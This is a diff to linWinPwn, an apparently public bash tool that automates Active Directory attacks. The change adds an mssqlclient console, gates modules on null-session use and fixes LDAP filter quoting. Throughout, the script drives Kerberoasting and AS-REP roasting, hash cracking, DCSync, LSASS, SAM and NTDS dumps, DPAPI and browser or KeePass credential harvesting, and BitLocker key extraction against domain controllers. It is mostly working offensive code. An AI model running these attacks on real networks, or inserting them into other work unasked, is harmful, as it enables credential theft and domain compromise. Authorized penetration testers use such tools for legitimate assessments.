@@ -76,6 +76,8 @@ impacket_psexec=$(which psexec.py)
 if [ ! -f "${impacket_psexec}" ]; then impacket_psexec=$(which impacket-psexec); fi
 impacket_smbpasswd=$(which smbpasswd.py)
 if [ ! -f "${impacket_smbpasswd}" ]; then impacket_smbpasswd=$(which impacket-smbpasswd); fi
+impacket_mssqlclient=$(which mssqlclient.py)
+if [ ! -f "${impacket_mssqlclient}" ]; then impacket_mssqlclient=$(which impacket-mssqlclient); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -127,7 +129,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.9 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.10 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -247,7 +249,7 @@ prepare (){
         if [ -z "$domain" ]; then domain=$dc_domain; fi
     fi
 
-    dc_open_ports=$(${nmap} -p 135,445,389,636 ${dc_ip} -sT -T5 --open)
+    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636 ${dc_ip} -sT -T5 --open)
     if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
@@ -548,7 +550,7 @@ authenticate (){
         auth_check=$(run_command "${netexec} smb ${target} ${argument_ne}" 2>&1| grep "\[-\]\|Traceback" -A 10 2>&1)
         if [ ! -z "$auth_check" ] ; then
             echo $auth_check
-            if [ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ] || [ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]; then
+            if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]] || [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                 if [ ! -f "${impacket_smbpasswd}" ] ; then
                     echo -e "${RED}[-] smbpasswd.py not found! Please verify the installation of impacket${NC}"
                 elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
@@ -951,9 +953,9 @@ bloodyad_all_enum () {
             echo -e "${CYAN}[*] Searching for containers${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get children --otype container" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter (&(samAccountType=805306368)(servicePrincipalName=*)) --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter (&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2342,9 +2344,31 @@ mssql_relay_check () {
     if [ ! -f "${mssqlrelay}" ]; then
         echo -e "${RED}[-] Please verify the location of mssqlrelay${NC}"
     else
-        echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-        run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -target ${dc_FQDN} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/DomainRecon/mssql_relay_output_${dc_domain}.txt" 2>&1
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] mssqlrelay requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/DomainRecon/mssql_relay_output_${dc_domain}.txt" 2>&1
+        fi
+    fi
+    echo -e ""
+}
+
+mssqlclient_console () {
+    if [ ! -f "${impacket_mssqlclient}" ]; then
+        echo -e "${RED}[-] mssqlclient.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] mssqlclient requires credentials${NC}"
+    else
+        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        read -p ">> " mssqlclient_target </dev/tty
+        while [ "${mssqlclient_target}" == "" ] ; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -p ">> " mssqlclient_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening mssqlclient.py console on target: $mssqlclient_target ${NC}"
+        run_command "${impacket_mssqlclient} ${argument_imp}\\@${mssqlclient_target} -windows-auth" 2>&1 | tee -a ${output_dir}/DomainRecon/impacket_mssqlclient_output.txt
     fi
     echo -e ""
 }
@@ -2939,44 +2963,68 @@ psexec_console () {
 }
 
 ad_enum () {
-    bhd_enum
-    ldapdomaindump_enum
-    enum4linux_enum
-    ne_gpp
-    ne_smb_enum
-    ne_ldap_enum
-    deleg_enum
-    bloodyad_all_enum
-    bloodyad_write_enum
-    windapsearch_enum
-    ldapwordharv_enum
-    rdwatool_enum
-    sccm_enum
-    GPOwned_enum
+    if [ "${nullsess_bool}" == true ] ; then
+        ldapdomaindump_enum
+        enum4linux_enum
+        ne_gpp
+        ne_smb_enum
+        windapsearch_enum
+    else
+        bhd_enum
+        ldapdomaindump_enum
+        enum4linux_enum
+        ne_gpp
+        ne_smb_enum
+        ne_ldap_enum
+        deleg_enum
+        bloodyad_all_enum
+        bloodyad_write_enum
+        windapsearch_enum
+        ldapwordharv_enum
+        rdwatool_enum
+        sccm_enum
+        GPOwned_enum
+    fi
 }
 
 adcs_enum () {
-    ne_adcs_enum
-    certi_py_enum
-    certipy_enum
-    certifried_check
+    if [ "${nullsess_bool}" == true ] ; then
+        ne_adcs_enum
+    else
+        ne_adcs_enum
+        certi_py_enum
+        certipy_enum
+        certifried_check
+    fi
 }
 
 bruteforce () {
-    ridbrute_attack
-    kerbrute_enum
-    userpass_kerbrute_check
-    pre2k_check 
+    if [ "${nullsess_bool}" == true ] ; then
+        ridbrute_attack
+        kerbrute_enum
+        userpass_kerbrute_check
+        pre2k_check
+    else
+        userpass_kerbrute_check
+        pre2k_check
+    fi
 }
 
 kerberos () {
-    asrep_attack
-    kerberoast_attack
-    asreprc4_attack
-    john_crack_asrep
-    john_crack_kerberoast
-    nopac_check
-    ms14-068_check
+    if [ "${nullsess_bool}" == true ] ; then
+        asrep_attack
+        kerberoast_attack
+        asreprc4_attack
+        john_crack_asrep
+        john_crack_kerberoast
+    else
+        asrep_attack
+        kerberoast_attack
+        john_crack_asrep
+        john_crack_kerberoast
+        nopac_check
+        ms14-068_check
+    fi
 }
 
 scan_shares () {
@@ -3002,17 +3050,25 @@ vuln_checks () {
 }
 
 mssql_checks () {
-    mssql_enum
-    mssql_relay_check
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${RED}MSSQL checks requires credentials.${NC}" 
+    else 
+        mssql_enum
+        mssql_relay_check
+    fi
 }
 
 pwd_dump () {
-    laps_dump
-    gmsa_dump
-    secrets_dump
-    nanodump_dump
-    dpapi_dump
-    juicycreds_dump
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${RED}Password dump requires credentials.${NC}" 
+    else    
+        laps_dump
+        gmsa_dump
+        secrets_dump
+        nanodump_dump
+        dpapi_dump
+        juicycreds_dump
+    fi
 }
 
 print_info () {
@@ -3138,7 +3194,11 @@ ad_menu() {
     echo -e ""
     echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
     echo -e "--------------------------------------------------------"
-    echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #1-3-4-5-6-7-8-9-10-14-15-16-17-20"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #3-4-5-6-14"
+    else
+        echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #1-3-4-5-6-7-8-9-10-14-15-16-17-20"
+    fi
     echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
     echo -e "2) BloodHound Enumeration using DCOnly"
     echo -e "3) ldapdomaindump LDAP Enumeration"
@@ -3296,7 +3356,11 @@ adcs_menu() {
     echo -e ""
     echo -e "${CYAN}[ADCS menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------"
-    echo -e "A) ADCS ENUMERATIONS #1-2-3-4"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "A) ADCS ENUMERATIONS #1"
+    else
+        echo -e "A) ADCS ENUMERATIONS #1-2-3-4"
+    fi
     echo -e "1) ADCS Enumeration using netexec"
     echo -e "2) certi.py ADCS Enumeration"
     echo -e "3) Certipy ADCS Enumeration"
@@ -3364,7 +3428,11 @@ adcs_menu() {
 bruteforce_menu() {
     echo -e "${CYAN}[BruteForce menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------------"
-    echo -e "A) BRUTEFORCE ATTACKS #1-2-3-5"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "A) BRUTEFORCE ATTACKS #1-2-3-5"
+    else
+        echo -e "A) BRUTEFORCE ATTACKS #3-5"
+    fi
     echo -e "1) RID Brute Force (Null session) using netexec"
     echo -e "2) User Enumeration using kerbrute (Null session)"
     echo -e "3) User=Pass check using kerbrute (Noisy!)"
@@ -3417,7 +3485,11 @@ kerberos_menu () {
     echo -e ""
     echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------------------"
-    echo -e "A) KERBEROS ATTACKS #1-2-3-4-5-6-7"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "A) KERBEROS ATTACKS #1-2-3-4-7"
+    else
+        echo -e "A) KERBEROS ATTACKS #1-2-3-4-5-6"
+    fi
     echo -e "1) AS REP Roasting Attack using GetNPUsers"
     echo -e "2) Kerberoast Attack using GetUserSPNs"
     echo -e "3) Cracking AS REP Roast hashes using john the ripper"
@@ -3989,9 +4061,14 @@ mssql_menu () {
     echo -e ""
     echo -e "${CYAN}[MSSQL Enumeration menu]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------------------"
-    echo -e "A) MSSQL CHECKS #1-2"
-    echo -e "1) MSSQL Enumeration using netexec"
-    echo -e "2) MSSQL Relay check"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] MSSQL Enumeration requires credentials${NC}"
+    else
+        echo -e "A) MSSQL CHECKS #1-2"
+        echo -e "1) MSSQL Enumeration using netexec"
+        echo -e "2) MSSQL Relay check"
+        echo -e "3) Open mssqlclient.py console on target"
+    fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4008,6 +4085,10 @@ mssql_menu () {
 
         2)
         mssql_relay_check
+        mssql_menu;;
+
+        3)
+        mssqlclient_console
         mssql_menu;;
 
         back)
@@ -4028,27 +4109,31 @@ pwd_menu () {
     echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
     echo -e "--------------------------------------------------------------"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
-    echo -e "A) PASSWORD DUMPS #1-2-4-12-13-16"
-    echo -e "m) Modify target(s)"
-    echo -e "1) LAPS Dump using netexec"
-    echo -e "2) gMSA Dump using netexec"
-    echo -e "3) DCSync using secretsdump (only on DC)"
-    echo -e "4) Dump SAM and LSA using secretsdump"
-    echo -e "5) Dump SAM and SYSTEM using reg"
-    echo -e "6) Dump NTDS using netexec"
-    echo -e "7) Dump SAM using netexec"
-    echo -e "8) Dump LSA secrets using netexec"
-    echo -e "9) Dump LSASS using lsassy"
-    echo -e "10) Dump LSASS using handlekatz"
-    echo -e "11) Dump LSASS using procdump"
-    echo -e "12) Dump LSASS using nanodump"
-    echo -e "13) Dump dpapi secrets using netexec"
-    echo -e "14) Dump secrets using DonPAPI"
-    echo -e "15) Dump secrets using hekatomb (only on DC)"
-    echo -e "16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
-    echo -e "17) Dump Veeam credentials (only from Veeam server)"
-    echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
-    echo -e "19) Extract Bitlocker Keys"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] Password Dump requires credentials${NC}"
+    else
+        echo -e "A) PASSWORD DUMPS #1-2-4-12-13-16"
+        echo -e "m) Modify target(s)"
+        echo -e "1) LAPS Dump using netexec"
+        echo -e "2) gMSA Dump using netexec"
+        echo -e "3) DCSync using secretsdump (only on DC)"
+        echo -e "4) Dump SAM and LSA using secretsdump"
+        echo -e "5) Dump SAM and SYSTEM using reg"
+        echo -e "6) Dump NTDS using netexec"
+        echo -e "7) Dump SAM using netexec"
+        echo -e "8) Dump LSA secrets using netexec"
+        echo -e "9) Dump LSASS using lsassy"
+        echo -e "10) Dump LSASS using handlekatz"
+        echo -e "11) Dump LSASS using procdump"
+        echo -e "12) Dump LSASS using nanodump"
+        echo -e "13) Dump dpapi secrets using netexec"
+        echo -e "14) Dump secrets using DonPAPI"
+        echo -e "15) Dump secrets using hekatomb (only on DC)"
+        echo -e "16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
+        echo -e "17) Dump Veeam credentials (only from Veeam server)"
+        echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
+        echo -e "19) Extract Bitlocker Keys"
+    fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
